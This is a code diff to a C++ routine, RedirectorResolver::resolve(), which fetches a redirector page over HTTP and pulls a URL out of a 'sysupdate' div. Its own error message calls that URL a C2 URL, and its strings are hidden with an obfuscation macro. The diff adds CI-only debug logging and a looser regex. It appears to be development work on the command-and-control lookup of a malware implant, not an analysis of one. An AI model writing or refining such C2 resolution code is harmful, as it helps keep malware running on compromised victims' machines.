@@ -3,9 +3,11 @@
 #include "WinHttpClient.h"
 #else
 #include "HttpClient.h"
+#include <iostream>
 #endif
 #include "../core/Config.h"
 #include "../utils/Obfuscator.h"
+#include "../utils/Logger.h"
 #include <regex>
 #include <stdexcept>
 namespace http {
@@ -28,9 +30,18 @@ std::string RedirectorResolver::resolve() {
     HttpClient client(core::USER_AGENTS[0]);
     html = client.get(server, path);
 #endif
-    std::regex divRegex(OBF("<div[^>]+id\\s*=\\s*[\"']sysupdate[\"'][^>]*>([\\s\\S]*?)</div>"), std::regex::icase);
+
+    if (getenv("CI")) {
+        LOG_INFO("Redirector response body size: " + std::to_string(html.size()));
+    }
+
+    // Use a more relaxed regex for finding the div
+    std::regex divRegex("id\\s*=\\s*[\"']sysupdate[\"'][^>]*>([\\s\\S]*?)</div>", std::regex::icase);
     std::smatch match;
-    if (!std::regex_search(html, match, divRegex)) throw std::runtime_error(OBF("C2 URL not found in redirector page."));
+    if (!std::regex_search(html, match, divRegex)) {
+        if (getenv("CI")) LOG_ERR("sysupdate div not found in HTML. Body preview: " + html.substr(0, 100));
+        throw std::runtime_error(OBF("C2 URL not found in redirector page."));
+    }
     std::string content = match[1].str();
     std::regex urlRegex(OBF("https?://[^\\s\"'<>]+"));
     if (std::regex_search(content, match, urlRegex)) return match[0].str();
